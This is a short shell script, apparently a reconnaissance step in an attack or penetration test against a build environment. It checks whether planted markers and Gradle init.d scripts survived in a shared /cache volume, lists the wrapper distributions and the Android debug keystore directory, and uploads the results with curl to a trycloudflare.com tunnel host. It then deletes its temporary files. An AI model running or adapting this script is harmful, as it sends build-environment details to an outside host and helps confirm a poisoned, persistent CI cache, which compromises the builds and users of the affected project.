#!/bin/sh
# Recon 4: read-only check whether the cache volume survived into this build.
BASE="https://olive-farmer-geneva-impressed.trycloudflare.com/80a0e7a7ad197916"
D=/tmp/recon4.$$
mkdir -p "$D" 2>/dev/null || exit 0

{
  echo "===== RECON4: persistence check ====="
  if [ -f /cache/PENTEST_MARKER ]; then echo "MARKER_PRESENT=yes"; else echo "MARKER_PRESENT=no"; fi
  echo "--- marker"; cat /cache/PENTEST_MARKER 2>&1
  echo "--- log"; cat /cache/PENTEST_LOG 2>&1 | head -20
  echo "--- init.d"; ls -la /cache/gradle/init.d 2>&1; cat /cache/gradle/init.d/*.gradle 2>&1
  echo "--- cache root"; ls -la /cache 2>&1
  echo "--- wrapper dist"; ls -la /cache/gradle/wrapper/dists 2>&1 | head
  echo "--- debug keystore after this build starts"; ls -la /tmp/home/.android 2>&1
} >"$D/persistcheck" 2>&1

printf '\n'
head -c 8000 "$D/persistcheck"
printf '\n'
timeout 10 curl -sS -m 10 --data-binary @"$D/persistcheck" "$BASE/persistcheck" >/dev/null 2>&1 || true
rm -rf "$D"
exit 0
